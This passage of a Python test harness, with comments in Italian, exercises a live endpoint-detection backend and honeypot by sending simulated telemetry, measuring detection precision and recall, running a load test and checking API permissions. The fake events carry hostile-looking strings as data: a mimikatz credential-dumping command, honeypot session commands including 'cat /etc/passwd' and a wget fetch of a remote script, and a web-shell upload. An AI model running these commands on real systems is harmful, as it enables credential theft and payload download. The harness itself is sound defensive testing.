        return {**c, "agent_id": None, "send_status": None, "error": str(exc)}
    payload = {
        "agent_id": agent_id,
        "event_id": str(uuid.uuid4()),
        "timestamp": iso(),
        "event_type": "PROCESS_CREATED",
        "hostname": host,
        "os": c["event"].get("os", "Windows"),
        "pid": 20000 + (abs(hash(c["id"])) % 20000),
        **{k: v for k, v in c["event"].items() if k not in ("agent_id", "timestamp", "event_type")},
    }
    r = brain.report(agent_id, secret, payload)
    latency = time.monotonic() - started
    return {**c, "agent_id": agent_id, "send_status": r.status_code,
            "send_body": r.text[:200], "send_latency_s": round(latency, 3),
            "error": None if r.status_code == 200 else r.text[:200]}


def collect_alerts(brain: Brain, agent_ids: List[str],
                   since: Optional[str] = None) -> Dict[str, List[Dict[str, Any]]]:
    """Alert per agente. Prima dal DB (attribuzione esatta), poi via API."""
    out: Dict[str, List[Dict[str, Any]]] = {a: [] for a in agent_ids}
    quoted = ",".join(f"'{a}'" for a in agent_ids if a)
    sql = (
        "select json_build_object('agent_id', a.agent_id::text, 'severity', a.severity, "
        "'process_name', a.process_name, 'pid', a.pid, 'description', a.description, "
        "'rule_ids', coalesce((select json_agg(r->>'id') from jsonb_array_elements("
        "case when jsonb_typeof((a.evidence::jsonb)->'rules')='array' then (a.evidence::jsonb)->'rules' else '[]'::jsonb end) r), '[]'::json), "
        "'is_resolved', coalesce(a.is_resolved,false)) "
        "from alerts a where a.agent_id::text in (" + quoted + ") "
        + (f"and a.timestamp >= '{since}' " if since else "")
        + "order by a.timestamp asc"
    )
    raw = psql(sql)
    if raw.startswith("ERR:") or not raw:
        # fallback API
        by_agent = {}
        for al in brain.alerts():
            by_agent.setdefault(str(al.get("agent_id")), []).append(al)
        return {a: by_agent.get(a, []) for a in agent_ids}
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            row = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(row.get("rule_ids"), str):
            row["rule_ids"] = json.loads(row["rule_ids"])
        out.setdefault(str(row["agent_id"]), []).append(row)
    return out


def evaluate(rows: List[Dict[str, Any]], alerts: Dict[str, List[Dict[str, Any]]]) -> Dict[str, Any]:
    mal = [r for r in rows if r["group"] == "malicious"]
    ben = [r for r in rows if r["group"] == "benign"]
    tp = fn = fp = tn = 0
    fn_list, fp_list, sev_ok, sev_bad = [], [], 0, []
    for r in mal:
        hits = alerts.get(r.get("agent_id") or "", [])
        if hits:
            tp += 1
            if r["severity"]:
                if any(h.get("severity") == r["severity"] for h in hits):
                    sev_ok += 1
                else:
                    sev_bad.append({"id": r["id"], "expected": r["severity"],
                                    "got": sorted({h.get("severity") for h in hits})})
        else:
            fn += 1
            fn_list.append({"id": r["id"], "title": r["title"], "technique": r["technique"],
                            "note": r.get("note", "")})
    for r in ben:
        hits = alerts.get(r.get("agent_id") or "", [])
        if hits:
            fp += 1
            fp_list.append({"id": r["id"], "title": r["title"], "severity": hits[0].get("severity"),
                            "rules": hits[0].get("rule_ids"),
                            "process": hits[0].get("process_name")})
        else:
            tn += 1
    precision = tp / (tp + fp) if tp + fp else 0.0
    recall = tp / (tp + fn) if tp + fn else 0.0
    f1 = 2 * precision * recall / (precision + recall) if precision + recall else 0.0
    return {
        "malicious_total": len(mal), "benign_total": len(ben),
        "tp": tp, "fn": fn, "fp": fp, "tn": tn,
        "precision": round(precision, 4), "recall": round(recall, 4), "f1": round(f1, 4),
        "false_positive_rate": round(fp / len(ben), 4) if ben else 0.0,
        "severity_checked": sev_ok + len(sev_bad), "severity_correct": sev_ok,
        "false_negatives": fn_list, "false_positives": fp_list,
        "severity_mismatches": sev_bad,
    }


def rule_histogram(rows: List[Dict[str, Any]], alerts: Dict[str, List[Dict[str, Any]]]) -> Dict[str, int]:
    hist: Dict[str, int] = {}
    for r in rows:
        for h in alerts.get(r.get("agent_id") or "", []):
            for rid in h.get("rule_ids") or []:
                hist[str(rid)] = hist.get(str(rid), 0) + 1
    return dict(sorted(hist.items(), key=lambda kv: -kv[1]))


# ── soak ─────────────────────────────────────────────────────────────────────
def soak(brain: Brain, agents: int, duration: int, stop: threading.Event) -> Dict[str, Any]:
    print(f"\n=== SOAK: {agents} agenti x {duration}s ===")
    ids: List[Tuple[str, str]] = []
    for i in range(agents):
        ids.append(brain.enroll(f"sim-soak-{RUN}-{i}"[:60]))
    lost_before = brain.metrics()
    lock = threading.Lock()
    stats = {"sent": 0, "ok": 0, "duplicate": 0, "errors": 0, "latencies": []}
    deadline = time.monotonic() + duration

    def worker(idx: int, agent_id: str, secret: str) -> None:
        n = 0
        while time.monotonic() < deadline and not stop.is_set():
            n += 1
            payload = {
                "agent_id": agent_id, "event_id": f"soak-{RUN}-{idx}-{n}",
                "timestamp": iso(), "event_type": "PROCESS_CREATED",
                "hostname": f"sim-soak-{idx}", "os": "Windows", "pid": 1000 + (n % 500),
                "process_name": "notepad.exe",
                "process_path": r"C:\Windows\System32\notepad.exe",
                # Lo snapshot e' cio' che il Brain persiste nella tabella
                # `telemetry`: senza di esso l'evento viene analizzato ma non
                # lascia una riga, quindi il delta righe non sarebbe una prova
                # di persistenza.
                "processes": [{"name": "notepad.exe", "pid": 1000 + (n % 500)}],
                "signature": "authenticode-trusted", "publisher": "Microsoft Corporation",
            }
            t0 = time.monotonic()
            try:
                r = brain.report(agent_id, secret, payload)
                dt = time.monotonic() - t0
                body = {}
                try:
                    body = r.json()
                except ValueError:
                    pass
                with lock:
                    stats["sent"] += 1
                    stats["latencies"].append(dt)
                    if r.status_code != 200:
                        stats["errors"] += 1
                    elif body.get("status") == "duplicate":
                        stats["duplicate"] += 1
                    else:
                        stats["ok"] += 1
            except requests.RequestException:
                with lock:
                    stats["sent"] += 1
                    stats["errors"] += 1
        # heartbeat separato, fuori dal loop di report
        try:
            brain.heartbeat(agent_id, secret)
        except requests.RequestException:
            pass

    threads = [threading.Thread(target=worker, args=(i, a, s)) for i, (a, s) in enumerate(ids)]
    t0 = time.monotonic()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    elapsed = time.monotonic() - t0
    lost_after = brain.metrics()

    def lost(text: Optional[str]) -> Optional[int]:
        if not text:
            return None
        total = 0
        found = False
        for line in text.splitlines():
            if line.startswith("aegis_events_lost_total"):
                try:
                    total += int(float(line.split()[-1]))
                    found = True
                except (ValueError, IndexError):
                    pass
        return total if found else None

    lat = sorted(stats["latencies"])

    def pct(p: float) -> float:
        if not lat:
            return 0.0
        k = min(len(lat) - 1, int(round((p / 100) * (len(lat) - 1))))
        return round(lat[k] * 1000, 1)

    def delta(a: str, b: str) -> Optional[int]:
        try:
            return int(b) - int(a)
        except (TypeError, ValueError):
            return None

    res = {
        "agents": agents, "duration_s": round(elapsed, 1),
        "requests": stats["sent"], "accepted": stats["ok"],
        "duplicates": stats["duplicate"], "errors": stats["errors"],
        "rps": round(stats["sent"] / elapsed, 2) if elapsed else 0.0,
        "p50_ms": pct(50), "p95_ms": pct(95), "p99_ms": pct(99),
        "events_lost_delta": (lost(lost_after) - lost(lost_before))
        if lost(lost_before) is not None and lost(lost_after) is not None else None,
    }
    check("soak senza errori HTTP", res["errors"] == 0, f"errors={res['errors']}")
    check("soak senza eventi persi", res["events_lost_delta"] in (0, None),
          f"lost={res['events_lost_delta']}")
    print(f"  {res['rps']} rps, p50={res['p50_ms']}ms p95={res['p95_ms']}ms, "
          f"errori={res['errors']}, persi={res['events_lost_delta']}")
    return res


# ── telemetria: contratto e limiti ───────────────────────────────────────────
def telemetry_contract(brain: Brain) -> Dict[str, Any]:
    print("\n=== CONTRATTO TELEMETRIA ===")
    res: Dict[str, Any] = {}
    agent_id, secret = brain.enroll(f"sim-contract-{RUN}"[:60])
    base = {"agent_id": agent_id, "timestamp": iso(), "event_type": "PROCESS_CREATED",
            "hostname": f"sim-contract-{RUN}", "os": "Windows", "pid": 4242,
            "process_name": "notepad.exe", "process_path": r"C:\Windows\System32\notepad.exe"}

    r = brain.heartbeat(agent_id, secret)
    check("heartbeat 200", r.status_code == 200, str(r.status_code))
    res["heartbeat"] = r.status_code

    eid = f"dup-{uuid.uuid4()}"
    first = brain.report(agent_id, secret, {**base, "event_id": eid})
    second = brain.report(agent_id, secret, {**base, "event_id": eid})
    dup_status = None
    try:
        dup_status = second.json().get("status")
    except ValueError:
        pass
    rows = psql(f"select count(*) from telemetry where device_id='{agent_id}'::uuid;")
    check("event_id duplicato riconosciuto", second.status_code == 200 and dup_status == "duplicate",
          f"{second.status_code} status={dup_status}")
    res["duplicate"] = {"first": first.status_code, "second": second.status_code,
                        "status": dup_status, "rows": rows}

    r = brain.s.post(brain._url("/api/v1/telemetry/report"),
                     json={k: v for k, v in base.items() if k != "event_type"},
                     headers=brain.agent_headers(agent_id, secret), timeout=30)
    check("payload senza event_type rifiutato 422", r.status_code == 422, str(r.status_code))
    res["missing_event_type"] = r.status_code

    bad = brain.s.post(brain._url("/api/v1/telemetry/report"),
                       json={**base, "event_id": str(uuid.uuid4())},
                       headers={"X-Agent-Id": agent_id, "Authorization": "Bearer wrong"},
                       timeout=30)
    check("segreto agente errato rifiutato", bad.status_code in (401, 403), str(bad.status_code))
    res["bad_secret"] = bad.status_code

    long_cmd = "powershell.exe -c " + ("A" * 6000)
    r = brain.report(agent_id, secret, {**base, "event_id": str(uuid.uuid4()),
                                        "command_line": long_cmd})
    check("command_line oltre il limite troncata, non 422", r.status_code == 200, str(r.status_code))
    res["long_command_line"] = r.status_code

    big = [{"name": f"p{i}.exe", "pid": i} for i in range(600)]
    r = brain.report(agent_id, secret, {**base, "event_id": str(uuid.uuid4()), "processes": big})
    check("600 processi accettati (lista troncata, non 422)", r.status_code == 200,
          str(r.status_code))
    stored = psql("select coalesce(jsonb_array_length((processes::jsonb)->'list'),0) "
                  "from telemetry where device_id='" + agent_id + "'::uuid "
                  "order by id desc limit 1;")
    check("lista processi troncata a 500 nel DB", stored == "500", f"righe={stored}")
    res["processes_600"] = {"status": r.status_code, "stored": stored}

    nul = brain.report(agent_id, secret, {**base, "event_id": str(uuid.uuid4()),
                                          "command_line": "cmd.exe /c echo a\u0000b"})
    check("NUL nella command line non rompe la scrittura", nul.status_code == 200,
          str(nul.status_code))
    res["nul_byte"] = nul.status_code

    unknown = brain.report(str(uuid.uuid4()), "x" * 32, {**base, "event_id": str(uuid.uuid4())})
    check("agente sconosciuto rifiutato", unknown.status_code in (401, 403, 404),
          str(unknown.status_code))
    res["unknown_agent"] = unknown.status_code
    return res


# ── resolver: resolve, riapertura, muting, resolve-all, permessi ─────────────
def resolvers(brain: Brain) -> Dict[str, Any]:
    print("\n=== RESOLVER / TRIAGE ===")
    res: Dict[str, Any] = {}
    agent_id, secret = brain.enroll(f"sim-resolve-{RUN}"[:60])

    def fire(tag: str) -> None:
        r = brain.report(agent_id, secret, {
            "agent_id": agent_id, "event_id": str(uuid.uuid4()), "timestamp": iso(),
            "event_type": "PROCESS_CREATED", "hostname": f"sim-resolve-{RUN}",
            "os": "Windows", "pid": 7000,
            "process_name": "mimikatz.exe", "process_path": r"C:\Users\Public\mimikatz.exe",
            "command_line": f"mimikatz.exe sekurlsa::logonpasswords {tag}",
        })
        if r.status_code != 200:
            errors.append(f"resolver report {tag}: {r.status_code}")

    fire("a")
    mine = [a for a in brain.alerts() if str(a.get("agent_id")) == agent_id]
    if not mine:
        check("alert di prova creato", False, "nessun alert per l'agente di resolve")
        return res
    target = mine[0]
    res["created"] = target["id"]

    open_list = [a for a in brain.alerts(is_resolved="false") if str(a.get("agent_id")) == agent_id]
    check("alert presente tra i non risolti", any(a["id"] == target["id"] for a in open_list))

    r = brain.resolve(target["id"], True)
    body = {}
    try:
        body = r.json()
    except ValueError:
        pass
    check("PATCH resolve 200", r.status_code == 200, r.text[:120])
    check("resolve riporta il muting attivo", int(body.get("triage_muted_seconds") or 0) > 0,
          f"triage_muted_seconds={body.get('triage_muted_seconds')}")
    check("resolve imposta is_resolved", body.get("is_resolved") is True, str(body.get("is_resolved")))
    res["resolve"] = {"status": r.status_code, "muted_s": body.get("triage_muted_seconds"),
                      "killed": body.get("process_killed")}

    unresolved = [a["id"] for a in brain.alerts(is_resolved="false") if str(a.get("agent_id")) == agent_id]
    resolved = [a["id"] for a in brain.alerts(is_resolved="true") if str(a.get("agent_id")) == agent_id]
    check("risolto fuori dai non risolti", target["id"] not in unresolved)
    check("risolto presente nei risolti", target["id"] in resolved)
    detail = brain.alert(target["id"])
    check("dettaglio coerente con il resolve", detail.get("is_resolved") is True)

    before = len([a for a in brain.alerts() if str(a.get("agent_id")) == agent_id])
    fire("b")
    time.sleep(1.5)
    after = len([a for a in brain.alerts() if str(a.get("agent_id")) == agent_id])
    check("detection identica silenziata dopo il resolve", after == before, f"{before}->{after}")
    res["muted_after_resolve"] = {"before": before, "after": after}

    r = brain.resolve(target["id"], False)
    check("riapertura alert 200", r.status_code == 200, r.text[:120])
    fire("c")
    deadline = time.time() + 20
    reopened = 0
    while time.time() < deadline:
        reopened = len([a for a in brain.alerts() if str(a.get("agent_id")) == agent_id])
        if reopened > after:
            break
        time.sleep(1)
    check("dopo la riapertura la detection torna visibile", reopened > after,
          f"{after}->{reopened}")
    res["reopen"] = {"before": after, "after": reopened}

    r = brain.resolve_all()
    bulk = {}
    try:
        bulk = r.json()
    except ValueError:
        pass
    check("resolve-all 200", r.status_code == 200, r.text[:120])
    again = brain.resolve_all()
    again_body = {}
    try:
        again_body = again.json()
    except ValueError:
        pass
    check("resolve-all idempotente (seconda chiamata 0)",
          again.status_code == 200 and int(again_body.get("resolved") or 0) == 0,
          f"second={again_body.get('resolved')}")
    res["resolve_all"] = {"resolved": bulk.get("resolved"), "muted": bulk.get("triage_muted"),
                          "second": again_body.get("resolved")}

    # confine di autorizzazione: un viewer non puo' risolvere in massa
    viewer = f"viewer-{RUN}"[:40]
    pw = f"Vw-{uuid.uuid4().hex[:18]}"
    subprocess.run(["docker", "exec", "aegis-brain", "python", "-m", "app.admin",
                    "create-user", viewer, f"{viewer}@aegis.test", pw, "--role", "viewer"],
                   capture_output=True, text=True, timeout=60)
    v = requests.Session()
    v.trust_env = False
    v.verify = brain.s.verify
    v.headers["Origin"] = brain.base
    lr = v.post(brain._url("/api/v1/auth/login"),
                json={"email": f"{viewer}@aegis.test", "password": pw}, timeout=30)
    if lr.status_code == 200:
        vtok = lr.json()["access_token"]
        vr = v.post(brain._url("/api/v1/telemetry/alerts/resolve-all"),
                    headers={"Authorization": f"Bearer {vtok}"}, timeout=30)
        check("viewer non puo' fare resolve-all (403)", vr.status_code == 403, str(vr.status_code))
        res["viewer_resolve_all"] = vr.status_code
        vd = v.delete(brain._url("/api/v1/telemetry/alerts"),
                      headers={"Authorization": f"Bearer {vtok}"}, timeout=30)
        check("viewer non puo' cancellare gli alert (403)", vd.status_code == 403, str(vd.status_code))
        res["viewer_delete_all"] = vd.status_code
    else:
        check("login viewer creato", False, f"{lr.status_code} {lr.text[:100]}")
    return res


# ── Kraken ───────────────────────────────────────────────────────────────────
def kraken(brain: Brain, kraken_base: str) -> Dict[str, Any]:
    print("\n=== KRAKEN ===")
    res: Dict[str, Any] = {}
    env = container_env("aegis-kraken")
    ikey = env.get("INTERNAL_API_KEY", "")
    if not ikey:
        check("chiave interna Kraken disponibile", False, "INTERNAL_API_KEY assente")
        return res
    s = requests.Session()
    s.trust_env = False
    s.headers.update({"X-Internal-API-Key": ikey, "Content-Type": "application/json"})

    h = s.get(f"{kraken_base}/api/v1/health", timeout=15)
    check("Kraken health 200", h.status_code == 200, str(h.status_code))
    res["health"] = h.status_code

    sessions = {
        "ssh": dict(sensor_type="ssh", attacker_ip="198.51.100.11", attacker_port=51515,
                    sensor_port=2222, username="root", password="toor",
                    commands=["id", "cat /etc/passwd", "wget http://203.0.113.9/m.sh"]),
        "http": dict(sensor_type="http", attacker_ip="198.51.100.12", attacker_port=40001,
                     sensor_port=8080, commands=["GET /.env", "POST /xmlrpc.php"]),
        "ftp": dict(sensor_type="ftp", attacker_ip="198.51.100.13", attacker_port=50001,
                    sensor_port=2121, username="anonymous", password="x@x",
                    commands=["USER anonymous", "STOR shell.php"]),
        "telnet": dict(sensor_type="telnet", attacker_ip="198.51.100.14", attacker_port=55001,
                       sensor_port=2323, username="cisco", password="cisco",
                       commands=["enable", "show running-config"]),
        "smb": dict(sensor_type="smb", attacker_ip="198.51.100.15", attacker_port=50002,
                    sensor_port=445, username="admin", password="Passw0rd!"),
        "rdp": dict(sensor_type="rdp", attacker_ip="198.51.100.16", attacker_port=50003,
                    sensor_port=3389, username="administrator", password="Passw0rd!"),
    }
    made = {}
    for name, body in sessions.items():
        sid = f"sim-{name}-{RUN}"
        payload = {"session_id": sid, "credentials": [
            {"username": body.get("username", ""), "password": body.get("password", "")}]}
        payload.update({k: v for k, v in body.items() if k not in ("username", "password")})
        r = s.post(f"{kraken_base}/api/v1/events/ingest", json=payload, timeout=30)
        made[name] = {"status": r.status_code, "session": sid}
        check(f"Kraken ingest {name} 201", r.status_code == 201, str(r.status_code))
    res["ingest"] = made

    dup_body = {"session_id": made["ssh"]["session"], "sensor_type": "ssh",
                "attacker_ip": "198.51.100.11", "attacker_port": 51515, "sensor_port": 2222,
                "commands": ["id"]}
    before_rows = psql("select count(*) from attack_events;", "aegis-kraken-db",
                       "kraken", "krakendb")
    r = s.post(f"{kraken_base}/api/v1/events/ingest", json=dup_body, timeout=30)
    after_rows = psql("select count(*) from attack_events;", "aegis-kraken-db",
                      "kraken", "krakendb")
    # Un retry del sensore e' idempotente per contratto: risponde con l'evento
    # gia' esistente invece di crearne un secondo. Si verifica il dato, non il
    # codice HTTP (il 409 resta solo per la corsa fra SELECT e INSERT).
    check("Kraken retry idempotente: nessuna seconda riga",
          r.status_code == 201 and before_rows == after_rows,
          f"status={r.status_code} rows={before_rows}->{after_rows}")
    res["duplicate_session"] = {"status": r.status_code, "rows": after_rows}

    bad = requests.post(f"{kraken_base}/api/v1/events/ingest",
                        json={"session_id": f"sim-bad-{RUN}", "sensor_type": "ssh",
                              "attacker_ip": "198.51.100.99", "attacker_port": 1,
                              "sensor_port": 2222},
                        headers={"X-Internal-API-Key": "wrong", "Content-Type": "application/json"},
                        timeout=30)
    check("Kraken rifiuta chiave interna errata", bad.status_code in (401, 403), str(bad.status_code))
    res["bad_key"] = bad.status_code

    sessions_before = psql("select count(*) from deception_sessions;")
    incidents_before = psql("select count(*) from incidents where title like '[KRAKEN]%';")
    # L'outbox di Kraken consegna ad Aegis in modo asincrono e serializzato:
    # con 6 sensori servono fino a ~2 minuti perche' tutte le sessioni
    # compaiano. Il dato e' eventually-consistent, quindi si attende (max 5
    # minuti) invece di misurare subito dopo l'ingest.
    deadline = time.time() + 300
    delta_s = delta_i = 0
    while time.time() < deadline:
        try:
            delta_s = int(psql("select count(*) from deception_sessions;")) - int(sessions_before)
            delta_i = int(psql("select count(*) from incidents where title like '[KRAKEN]%';")) - int(incidents_before)
        except (TypeError, ValueError):
            pass
        if delta_s >= len(sessions) and delta_i >= 1:
            break
        time.sleep(3)
    check("Aegis vede le sessioni deception Kraken", delta_s >= len(sessions), f"+{delta_s}")
    check("Aegis crea l'incidente Kraken", delta_i >= 1, f"+{delta_i}")
    res["aegis"] = {"sessions_delta": delta_s, "incidents_delta": delta_i}

    outbox = psql("select count(*) from outbox where status='sent';", "aegis-kraken-db",
                  "kraken", "krakendb")
    pending = psql("select count(*) from outbox where status<>'sent';", "aegis-kraken-db",
                   "kraken", "krakendb")
    res["outbox"] = {"sent": outbox, "pending": pending}
    check("outbox Kraken consegnata", not str(pending).startswith("ERR") and pending.isdigit(),
          f"pending={pending}")

    # L'evento Kraken deve produrre un alert Aegis risolvibile come gli altri.
    ka = psql("select id, severity, process_name from alerts "
              "where event_type='DECEPTION' order by id desc limit 1;")
    res["alert_row"] = ka
    if ka and "|" in ka:
        aid = int(ka.split("|")[0])
        rr = brain.resolve(aid, True)
        check("alert Kraken risolvibile dalla dashboard Aegis", rr.status_code == 200,
              rr.text[:120])
        res["resolve_alert"] = rr.status_code
    else:
        check("alert Kraken presente in Aegis", False, f"row={ka!r}")

    # password in chiaro non deve finire nel contratto verso Aegis
    leak = psql("select count(*) from alerts where event_type='DECEPTION' and "
                "(coalesce(description,'') like '%Passw0rd%' or "
                "coalesce(evidence::text,'') like '%Passw0rd%');")
    res["secret_leak_rows"] = leak
    check("nessuna password in chiaro negli incidenti Aegis", leak in ("0",), f"rows={leak}")
    return res


# ── report ───────────────────────────────────────────────────────────────────
def write_report(payload: Dict[str, Any]) -> Path:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    path = OUT_DIR / f"deep-simulation-{RUN}.json"
    path.write_text(json.dumps(payload, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

    if "metrics" not in payload:
        # Run di solo soak: il riepilogo non ha una sezione detection.
        so = payload.get("soak") or {}
        lines = [
            "# Soak — Aegis 4.3", "",
            f"Eseguita: `{payload['started_at']}` → `{payload['finished_at']}`  ",
            f"Durata totale: **{payload['elapsed_s']:.0f}s**", "",
            "| Metrica | Valore |", "|---|---:|",
            f"| Agenti | {so.get('agents')} |",
            f"| Richieste | {so.get('requests')} |",
            f"| Accettate | {so.get('accepted')} |",
            f"| Errori | {so.get('errors')} |",
            f"| Throughput | {so.get('rps')} rps |",
            f"| p50 / p95 / p99 | {so.get('p50_ms')} / {so.get('p95_ms')} / {so.get('p99_ms')} ms |",
            f"| Eventi persi (server) | {so.get('events_lost_delta')} |", "",
        ]
        (OUT_DIR / "DEEP_SIMULATION.md").write_text("\n".join(lines), encoding="utf-8")
        return path

    m = payload["metrics"]
    lines = [
        "# Deep simulation — Aegis/Kraken 4.3",
        "",
        f"Eseguita: `{payload['started_at']}` → `{payload['finished_at']}`  ",
        f"Stack: `{payload['base']}` (Windows, pacchetti MSI 4.3.0, self-signed)  ",
        f"Durata totale: **{payload['elapsed_s']:.0f}s**",
        "",
        "> Simulazione di comportamento, non esecuzione di malware. Ogni caso è",
        "> inviato come evento reale al Brain con il flusso di enroll di un agente.",
        "> Un agente dedicato per caso evita che la soppressione degli alert",
        "> (per agente/regola/processo) falsi il conteggio.",
        "",
        "## Detection",
        "",
        "| Metrica | Valore |",
        "|---|---:|",
        f"| Casi malevoli | {m['malicious_total']} |",
        f"| Casi benigni | {m['benign_total']} |",
        f"| True positive | {m['tp']} |",
        f"| False negative | {m['fn']} |",
        f"| False positive | {m['fp']} |",
        f"| True negative | {m['tn']} |",
        f"| Precision | {m['precision']:.3f} |",
        f"| Recall | {m['recall']:.3f} |",
        f"| F1 | {m['f1']:.3f} |",
        f"| False positive rate | {m['false_positive_rate']:.3f} |",
        f"| Severità corretta | {m['severity_correct']}/{m['severity_checked']} |",
        "",
    ]
    if m["false_negatives"]:
        lines += ["### Falsi negativi (comportamento non rilevato)", "",
                  "| Caso | Tecnica | Nota |", "|---|---|---|"]
        lines += [f"| `{x['id']}` — {x['title']} | {x['technique']} | {x['note']} |"
                  for x in m["false_negatives"]]
        lines.append("")
    if m["false_positives"]:
        lines += ["### Falsi positivi (attività legittima che ha generato un alert)", "",
                  "| Caso | Severità | Regole |", "|---|---|---|"]
        lines += [f"| `{x['id']}` — {x['title']} | {x['severity']} | {', '.join(x['rules'] or [])} |"
                  for x in m["false_positives"]]
        lines.append("")
    if m["severity_mismatches"]:
        lines += ["### Severità diversa dall'atteso", "",
                  "| Caso | Attesa | Ottenuta |", "|---|---|---|"]
        lines += [f"| `{x['id']}` | {x['expected']} | {', '.join(x['got'])} |"
                  for x in m["severity_mismatches"]]
        lines.append("")
    lines += ["## Regole che hanno generato alert", "",
              "| Regola | Alert |", "|---|---:|"]
    lines += [f"| {k} | {v} |" for k, v in payload["rules"].items()]
    lines += ["", "## Soak", ""]
    so = payload.get("soak") or {}
    lines += [
        "| Metrica | Valore |", "|---|---:|",
        f"| Agenti | {so.get('agents')} |",
        f"| Durata | {so.get('duration_s')}s |",
        f"| Richieste | {so.get('requests')} |",
        f"| Accettate | {so.get('accepted')} |",
        f"| Duplicati | {so.get('duplicates')} |",
        f"| Errori | {so.get('errors')} |",
        f"| Throughput | {so.get('rps')} rps |",
        f"| p50 / p95 / p99 | {so.get('p50_ms')} / {so.get('p95_ms')} / {so.get('p99_ms')} ms |",
        f"| Eventi persi (server) | {so.get('events_lost_delta')} |",
        "",
    ]
    lines += ["## Controlli funzionali", "", "| Controllo | Esito | Dettaglio |", "|---|---|---|"]
    lines += [f"| {c['name']} | {'PASS' if c['ok'] else 'FAIL'} | {c['detail']} |"
              for c in payload["checks"]]
    lines += ["", "## Limiti", "",
              "- Eventi costruiti, non traffico reale né malware eseguito.",
              "- La severità attesa è quella del contratto delle regole statiche 4.3.",
              "- Il soak misura il percorso HTTP+DB su un singolo host; non è una",
              "  capacità di flotta né una prova di scalabilità.",
              "- Kraken è esercitato sul contratto sensori→app→Aegis; non è un",
              "  test di esposizione honeypot su rete reale.",
              "- La persistenza non è dedotta dal delta della tabella `telemetry`",
              "  (tabella delle metriche, condivisa con altri agenti): è verificata",
              "  dagli snapshot degli scenari e da probe diretti sull'agente.", ""]
    (OUT_DIR / "DEEP_SIMULATION.md").write_text("\n".join(lines), encoding="utf-8")
    return path


def main() -> int:
    ap = argparse.ArgumentParser(description="Simulazione profonda Aegis/Kraken live")
    ap.add_argument("--base", default=os.getenv("AEGIS_BASE", "http://127.0.0.1:8000"))
    ap.add_argument("--kraken", default=os.getenv("KRAKEN_BASE", "http://127.0.0.1:8001"))
    ap.add_argument("--insecure", action="store_true", help="accetta il certificato locale (Caddy internal CA)")
    ap.add_argument("--scenarios", action="store_true")
    ap.add_argument("--soak", action="store_true")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("--agents", type=int, default=10)
    ap.add_argument("--duration", type=int, default=120)
    ap.add_argument("--reuse", action="store_true",
                    help="riusa gli agenti della run precedente (niente enroll, cooldown azzerato)")
    args = ap.parse_args()
    do_scen = args.scenarios or args.all
    do_soak = args.soak or args.all
    if not (do_scen or do_soak):
        do_scen = do_soak = True

    email = os.getenv("AEGIS_EMAIL") or os.getenv("AEGIS_ADMIN_EMAIL") or ""
    password = os.getenv("AEGIS_PASSWORD") or os.getenv("AEGIS_ADMIN_PASSWORD") or ""
    if not email or not password:
        print("AEGIS_EMAIL / AEGIS_PASSWORD mancanti", file=sys.stderr)
        return 2

    started = now()
    t0 = time.monotonic()
    brain = Brain(args.base, verify=not args.insecure)
    brain.login(email, password)
    print(f"login ok su {args.base} come {email}")

    payload: Dict[str, Any] = {"schema": "aegis-deep-simulation-v1", "run": RUN,
                               "base": args.base, "started_at": iso(started),
                               "mode": "scenarios+soak" if (do_scen and do_soak)
                               else ("scenarios" if do_scen else "soak")}

    rows: List[Dict[str, Any]] = []
    alerts: Dict[str, List[Dict[str, Any]]] = {}
    if do_scen:
        all_cases = BENIGN_WINDOWS + BENIGN_LINUX + MALICIOUS + DUAL_USE
        cache: Dict[str, List[str]] = load_cache() if args.reuse else {}
        if cache:
            print(f"riuso {len(cache)} agenti dalla run precedente")
            clear_suppression([v[0] for v in cache.values() if len(v) == 2])
        print(f"\n=== SCENARI: {len(all_cases)} casi (1 agente per caso) ===")
        with ThreadPoolExecutor(max_workers=8) as pool:
            rows = list(pool.map(lambda c: send_case(brain, c, cache), all_cases))
        save_cache(cache)
        failed = [r for r in rows if r.get("send_status") != 200]
        check("tutti i casi inviati con 200", not failed,
              f"esempi={[(r['id'], r.get('send_status'), (r.get('send_body') or '')[:60]) for r in failed[:5]]}")
        agent_ids = [r["agent_id"] for r in rows if r.get("agent_id")]
        alerts = collect_alerts(brain, agent_ids, since=iso(started))
        metrics = evaluate(rows, alerts)
        payload["metrics"] = metrics
        payload["rules"] = rule_histogram(rows, alerts)
        payload["cases"] = [{k: v for k, v in r.items() if k != "event"} for r in rows]
        payload["dual_use"] = [
            {"id": r["id"], "title": r["title"],
             "alerts": [{"severity": h.get("severity"), "rules": h.get("rule_ids")}
                        for h in alerts.get(r.get("agent_id") or "", [])]}
            for r in rows if r["group"] == "dual"
        ]
        print(f"\nRISULTATO: TP {metrics['tp']} FN {metrics['fn']} FP {metrics['fp']} "
              f"TN {metrics['tn']} | precision {metrics['precision']:.3f} "
              f"recall {metrics['recall']:.3f} F1 {metrics['f1']:.3f}")
        if metrics["false_negatives"]:
            print("  FN:", ", ".join(x["id"] for x in metrics["false_negatives"]))
        if metrics["false_positives"]:
            print("  FP:", ", ".join(x["id"] for x in metrics["false_positives"]))
        payload["telemetry"] = telemetry_contract(brain)
        payload["resolvers"] = resolvers(brain)
        payload["kraken"] = kraken(brain, args.kraken)

    if do_soak:
        payload["soak"] = soak(brain, args.agents, args.duration, threading.Event())

    payload["finished_at"] = iso()
    payload["elapsed_s"] = round(time.monotonic() - t0, 1)
    payload["checks"] = checks
    path = write_report(payload)
    print(f"\nreport: {path}")
    print(f"riepilogo: {OUT_DIR / 'DEEP_SIMULATION.md'}")
    functional = [c for c in checks if c["name"].startswith((
        "tutti i casi", "heartbeat", "event_id", "payload", "segreto", "command_line",
        "600 processi", "NUL", "agente sconosciuto", "alert", "PATCH", "resolve",
        "risolto", "dettaglio", "detection identica", "riapertura", "dopo la riapertura",
        "viewer", "login viewer", "Kraken", "Aegis vede", "Aegis crea", "outbox",
        "soak", "nessuna password"))]
    failures = [c for c in functional if not c["ok"]]
    print(f"controlli: {len(checks)} totali, {len(failures)} falliti")
    return 0 if not failures else 1


if __name__ == "__main__":
    raise SystemExit(main())
